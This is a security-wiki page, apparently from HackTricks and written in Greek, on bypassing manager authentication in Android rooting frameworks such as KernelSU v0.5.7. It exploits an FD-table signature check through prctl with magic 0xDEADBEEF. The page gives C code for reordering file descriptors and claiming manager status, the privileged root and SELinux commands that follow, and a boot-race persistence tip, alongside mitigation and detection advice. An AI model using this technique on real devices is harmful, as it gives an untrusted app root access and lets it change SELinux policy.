# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Τα frameworks rooting όπως το KernelSU, APatch, SKRoot και Magisk συχνά διορθώνουν τον πυρήνα Linux/Android και εκθέτουν προνομιακή λειτουργικότητα σε μια μη προνομιούχα εφαρμογή "manager" μέσω ενός hooked syscall. Εάν το βήμα αυθεντικοποίησης του manager είναι ελαττωματικό, οποιαδήποτε τοπική εφαρμογή μπορεί να φτάσει σε αυτό το κανάλι και να κλιμακώσει τα προνόμια σε ήδη-rooted συσκευές.

Αυτή η σελίδα αποτυπώνει τις τεχνικές και τις παγίδες που αποκαλύφθηκαν σε δημόσια έρευνα (ιδίως την ανάλυση του Zimperium για το KernelSU v0.5.7) για να βοηθήσει τόσο τις κόκκινες όσο και τις μπλε ομάδες να κατανοήσουν τις επιφάνειες επίθεσης, τα πρωτότυπα εκμετάλλευσης και τις ισχυρές μετρήσεις.

---
## Αρχιτεκτονική πρότυπο: syscall-hooked manager channel

- Το module/patch του πυρήνα συνδέει ένα syscall (συνήθως prctl) για να λαμβάνει "εντολές" από το userspace.
- Το πρωτόκολλο είναι συνήθως: magic_value, command_id, arg_ptr/len ...
- Μια εφαρμογή manager στο userspace αυθεντικοποιείται πρώτα (π.χ., CMD_BECOME_MANAGER). Μόλις ο πυρήνας χαρακτηρίσει τον καλούντα ως αξιόπιστο manager, γίνονται αποδεκτές οι προνομιακές εντολές:
- Δώστε root στον καλούντα (π.χ., CMD_GRANT_ROOT)
- Διαχειριστείτε τις λίστες επιτρεπόμενων/απαγορευμένων για su
- Ρυθμίστε την πολιτική SELinux (π.χ., CMD_SET_SEPOLICY)
- Ερωτήστε την έκδοση/διαμόρφωση
- Επειδή οποιαδήποτε εφαρμογή μπορεί να καλέσει syscalls, η ορθότητα της αυθεντικοποίησης του manager είναι κρίσιμη.

Παράδειγμα (σχεδίαση KernelSU):
- Hooked syscall: prctl
- Magic value για να παρακαμφθεί στον χειριστή του KernelSU: 0xDEADBEEF
- Οι εντολές περιλαμβάνουν: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, κ.λπ.

---
## Ροή αυθεντικοποίησης KernelSU v0.5.7 (όπως υλοποιείται)

Όταν το userspace καλεί prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), το KernelSU επαληθεύει:

1) Έλεγχος προθέματος διαδρομής
- Η παρεχόμενη διαδρομή πρέπει να ξεκινά με ένα αναμενόμενο πρόθεμα για το UID του καλούντα, π.χ. /data/data/<pkg> ή /data/user/<id>/<pkg>.
- Αναφορά: core_hook.c (v0.5.7) λογική προθέματος διαδρομής.

2) Έλεγχος ιδιοκτησίας
- Η διαδρομή πρέπει να ανήκει στον UID του καλούντα.
- Αναφορά: core_hook.c (v0.5.7) λογική ιδιοκτησίας.

3) Έλεγχος υπογραφής APK μέσω σάρωσης πίνακα FD
- Επαναλάβετε τους ανοιχτούς περιγραφείς αρχείων (FDs) της καλούσας διαδικασίας.
- Επιλέξτε το πρώτο αρχείο του οποίου η διαδρομή ταιριάζει με /data/app/*/base.apk.
- Αναλύστε την υπογραφή APK v2 και επαληθεύστε την με την επίσημη πιστοποίηση του manager.
- Αναφορές: manager.c (επανάληψη FDs), apk_sign.c (επικύρωση APK v2).

Εάν περάσουν όλοι οι έλεγχοι, ο πυρήνας αποθηκεύει προσωρινά το UID του manager και δέχεται προνομιακές εντολές από αυτό το UID μέχρι να επαναρυθμιστεί.

---
## Κατηγορία ευπάθειας: εμπιστοσύνη στην "πρώτη ταιριαστή APK" από την επανάληψη FD

Εάν ο έλεγχος υπογραφής συνδέεται με "την πρώτη ταιριαστή /data/app/*/base.apk" που βρέθηκε στον πίνακα FD της διαδικασίας, στην πραγματικότητα δεν επαληθεύει το δικό του πακέτο του καλούντα. Ένας επιτιθέμενος μπορεί να τοποθετήσει εκ των προτέρων μια νόμιμα υπογεγραμμένη APK (του πραγματικού manager) έτσι ώστε να εμφανίζεται νωρίτερα στη λίστα FD από το δικό του base.apk.

Αυτή η εμπιστοσύνη μέσω έμμεσης αναφοράς επιτρέπει σε μια μη προνομιούχα εφαρμογή να προσποιείται τον manager χωρίς να κατέχει το κλειδί υπογραφής του manager.

Κύριες ιδιότητες που εκμεταλλεύονται:
- Η σάρωση FD δεν συνδέεται με την ταυτότητα του πακέτου του καλούντα; απλώς ταιριάζει με τις συμβολοσειρές διαδρομής.
- Το open() επιστρέφει τον χαμηλότερο διαθέσιμο FD. Κλείνοντας πρώτα τους χαμηλότερους αριθμημένους FDs, ένας επιτιθέμενος μπορεί να ελέγξει τη σειρά.
- Ο φίλτρος ελέγχει μόνο ότι η διαδρομή ταιριάζει με /data/app/*/base.apk – όχι ότι αντιστοιχεί στο εγκατεστημένο πακέτο του καλούντα.

---
## Προϋποθέσεις επίθεσης

- Η συσκευή είναι ήδη rooted με ένα ευάλωτο framework rooting (π.χ., KernelSU v0.5.7).
- Ο επιτιθέμενος μπορεί να εκτελέσει αυθαίρετο μη προνομιούχο κώδικα τοπικά (διαδικασία Android app).
- Ο πραγματικός manager δεν έχει αυθεντικοποιηθεί ακόμη (π.χ., αμέσως μετά από μια επανεκκίνηση). Ορισμένα frameworks αποθηκεύουν το UID του manager μετά την επιτυχία; πρέπει να κερδίσετε τον αγώνα.

---
## Σκηνικό εκμετάλλευσης (KernelSU v0.5.7)

Βασικά βήματα:
1) Δημιουργήστε μια έγκυρη διαδρομή προς τον κατάλογο δεδομένων της δικής σας εφαρμογής για να ικανοποιήσετε τους ελέγχους προθέματος και ιδιοκτησίας.
2) Βεβαιωθείτε ότι μια γνήσια APK του KernelSU Manager είναι ανοιχτή σε έναν χαμηλότερο αριθμημένο FD από το δικό σας base.apk.
3) Καλέστε prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) για να περάσετε τους ελέγχους.
4) Εκδώστε προνομιακές εντολές όπως CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY για να διατηρήσετε την ανύψωση.

Πρακτικές σημειώσεις για το βήμα 2 (σειρά FD):
- Εντοπίστε τον FD της διαδικασίας σας για το δικό σας /data/app/*/base.apk περπατώντας στους συμβολικούς συνδέσμους /proc/self/fd.
- Κλείστε έναν χαμηλό FD (π.χ., stdin, fd 0) και ανοίξτε πρώτα την νόμιμη APK του manager ώστε να καταλαμβάνει τον fd 0 (ή οποιονδήποτε δείκτη χαμηλότερο από τον δικό σας fd base.apk).
- Συμπεριλάβετε την νόμιμη APK του manager με την εφαρμογή σας ώστε η διαδρομή της να ικανοποιεί τον απλό φίλτρο του πυρήνα. Για παράδειγμα, τοποθετήστε την κάτω από μια υποδιαδρομή που ταιριάζει με /data/app/*/base.apk.

Παράδειγμα κώδικα (Android/Linux, μόνο για επεξηγηματικούς σκοπούς):

Επαναλάβετε τους ανοιχτούς FDs για να εντοπίσετε τις εγγραφές base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Αναγκάστε έναν FD με χαμηλότερο αριθμό να δείχνει στην νόμιμη APK του διαχειριστή:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Διαχείριση αυθεντικοποίησης μέσω του prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Μετά την επιτυχία, οι προνομιακές εντολές (παραδείγματα):
- CMD_GRANT_ROOT: προώθηση της τρέχουσας διαδικασίας σε root
- CMD_ALLOW_SU: προσθήκη του πακέτου/UID σας στη λίστα επιτρεπόμενων για μόνιμο su
- CMD_SET_SEPOLICY: προσαρμογή της πολιτικής SELinux όπως υποστηρίζεται από το πλαίσιο

Συμβουλή για αγώνα/επιμονή:
- Εγγραφείτε σε έναν δέκτη BOOT_COMPLETED στο AndroidManifest (RECEIVE_BOOT_COMPLETED) για να ξεκινήσετε νωρίς μετά την επανεκκίνηση και να προσπαθήσετε να αυθεντικοποιήσετε πριν από τον πραγματικό διαχειριστή.

---
## Κατευθυντήριες γραμμές ανίχνευσης και μετριασμού

Για προγραμματιστές πλαισίων:
- Συνδέστε την αυθεντικοποίηση με το πακέτο/UID του καλούντος, όχι με τυχαίους FD:
- Εντοπίστε το πακέτο του καλούντος από το UID του και επαληθεύστε το με την υπογραφή του εγκατεστημένου πακέτου (μέσω του PackageManager) αντί να σαρώσετε τους FD.
- Εάν είναι μόνο πυρήνας, χρησιμοποιήστε σταθερή ταυτότητα καλούντος (task creds) και επαληθεύστε σε μια σταθερή πηγή αλήθειας που διαχειρίζεται ο init/userspace helper, όχι τους FD διαδικασίας.
- Αποφύγετε τους ελέγχους προθέματος διαδρομής ως ταυτότητα; είναι προφανώς ικανοποιημένοι από τον καλούντα.
- Χρησιμοποιήστε προκλήσεις βασισμένες σε nonce–απάντηση μέσω του καναλιού και καθαρίστε οποιαδήποτε αποθηκευμένη ταυτότητα διαχειριστή κατά την εκκίνηση ή σε σημαντικά γεγονότα.
- Σκεφτείτε την αυθεντικοποιημένη IPC βασισμένη σε binder αντί να υπερφορτώνετε τις γενικές syscalls όταν είναι εφικτό.

Για αμυντικούς/μπλε ομάδες:
- Ανιχνεύστε την παρουσία πλαισίων ριζοποίησης και διαδικασιών διαχειριστή; παρακολουθήστε τις κλήσεις prctl με ύποπτες μαγικές σταθερές (π.χ., 0xDEADBEEF) εάν έχετε τηλεμετρία πυρήνα.
- Σε διαχειριζόμενα στόλους, αποκλείστε ή ειδοποιήστε για δέκτες εκκίνησης από μη αξιόπιστα πακέτα που προσπαθούν γρήγορα να εκτελέσουν προνομιακές εντολές διαχειριστή μετά την εκκίνηση.
- Βεβαιωθείτε ότι οι συσκευές είναι ενημερωμένες σε διορθωμένες εκδόσεις πλαισίου; ακυρώστε τις αποθηκευμένες ταυτότητες διαχειριστή κατά την ενημέρωση.

Περιορισμοί της επίθεσης:
- Επηρεάζει μόνο συσκευές που είναι ήδη ριζωμένες με ένα ευάλωτο πλαίσιο.
- Συνήθως απαιτεί επανεκκίνηση/παράθυρο αγώνα πριν από την αυθεντικοποίηση του νόμιμου διαχειριστή (ορισμένα πλαίσια αποθηκεύουν το UID του διαχειριστή μέχρι την επαναφορά).

---
## Σχετικές σημειώσεις σε διάφορα πλαίσια

- Η αυθεντικοποίηση με βάση τον κωδικό πρόσβασης (π.χ., ιστορικές εκδόσεις APatch/SKRoot) μπορεί να είναι αδύναμη εάν οι κωδικοί πρόσβασης είναι μαντεύσιμοι/βίαιοι ή οι επικυρώσεις είναι ελαττωματικές.
- Η αυθεντικοποίηση με βάση το πακέτο/υπογραφή (π.χ., KernelSU) είναι ισχυρότερη στην αρχή αλλά πρέπει να συνδέεται με τον πραγματικό καλούντα, όχι με έμμεσες οντότητες όπως οι σαρώσεις FD.
- Magisk: CVE-2024-48336 (MagiskEoP) έδειξε ότι ακόμη και ώριμα οικοσυστήματα μπορεί να είναι ευάλωτα σε παραποίηση ταυτότητας που οδηγεί σε εκτέλεση κώδικα με root μέσα στο πλαίσιο του διαχειριστή.

---
## Αναφορές

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
